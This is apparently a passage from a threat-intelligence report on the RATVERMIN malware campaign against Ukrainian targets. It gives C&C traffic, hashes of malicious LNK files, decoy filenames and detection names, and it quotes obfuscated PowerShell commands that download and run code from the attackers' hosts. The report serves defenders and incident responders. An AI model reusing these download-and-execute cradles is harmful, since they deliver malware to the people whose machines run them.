@@ -1,0 +1,18 @@
+
+Upon resetting the machine and executing the malware again, this time with a text file open asking why they sent ransomware, the threat group responded by sending the following message via RATVERMIN's C&C domain (Figure 6): C&C to Victim HTTP/1.1 200 OK Content-Length: 5203
+Content-Type: multipart/related; type=\"application/
+xop+xml\";start=\"<http://tempuri[.]org/0>\";boundary=\"uuid:67761605- 5c90-47ac-bcd8- 718a09548d60+id=14\";start-info=\"application/soap+xml\" Server: Microsoft-HTTPAPI/2.0 MIME-Version: 1.0 Date: Tue, 20 Mar 2018 19:01:26 GMT --uuid:67761605-5c90-47ac-bcd8-718a09548d60+id=14 Content-ID: <http://tempuri[.]org/0> Content-Transfer-Encoding: 8bit Content-Type: application/xop+xml;charset=utf-8;type=\"application/soap+xml\" <TRUNCATED> Mad ?
+Figure 6: RATVERMIN's C&C domain message Related Samples Further research uncovered additional LNK files with PowerShell scripts that connect to the same C&C server.
+Filename: Висновки.
+S021000262_1901141812000.
+Scancopy_0003.
+HP LaserJet Enterprise 700 M775dn(CC522A).docx.lnk (Ukrainian translation: Conclusion) MD5: fe198e90813c5ee1cfd95edce5241e25 Description: LNK file also has the substituted Microsoft Word document icon and sends a request to the same C&C domain C&C: http://sinoptik[.]website/OxslV6 PowerShell activity (Command Line Arguments): vbscript:Execute(\"CreateObject(\"\"Wscript.
+Shell\"\").Run \"\"powershell.exe -c iex(iwr -useb http://sinoptik[.]website/OxslV6)\"\", 0 : window.close\") Figure 7:
+Additional LNK files with PowerShell scripts Filename: КМУ база даних.zip (Ukrainian translation: Cabinet of Ministers of Ukraine database)
+MD5: a5300dc3e19f0f0b919de5cda4aeb71c Description: ZIP archive containing a malicious LNK file Filename: Додаток.pdf (Ukrainian translation: Addition) MD5: a40fb835a54925aea12ffaa0d76f4ca7 Description: Benign decoy document Filename: КМУ_база_даних_органи_упр,_СГ_КМУ.rtf.lnk MD5: 4b8aac0649c3a846c24f93dc670bb1ef Description: Malicious LNK that executes a PowerShell script C&C: http://cdn1186[.]site/zG4roJ powershell.exe -NoP -NonI -W hidden -Com \"$cx=New-Object -ComObject MsXml2.ServerXmlHttp;$cx.
+Open('GET','http://cdn1186[.]site/zG4roJ',$False);$cx.
+Send(); $cx.ResponseText|.
+( ''.Remove.
+ToString()[14,50,27]-Join'')\" !
+%SystemRoot%\\system32\\shell32.dll Figure 8:
+Additional LNK files with PowerShell scripts FireEye Detection FireEye detection names for the indicators in the attack include the following: FireEye Endpoint Security INVOKE CRADLECRAFTER (UTILITY) MALICIOUS SCRIPT CONTENT
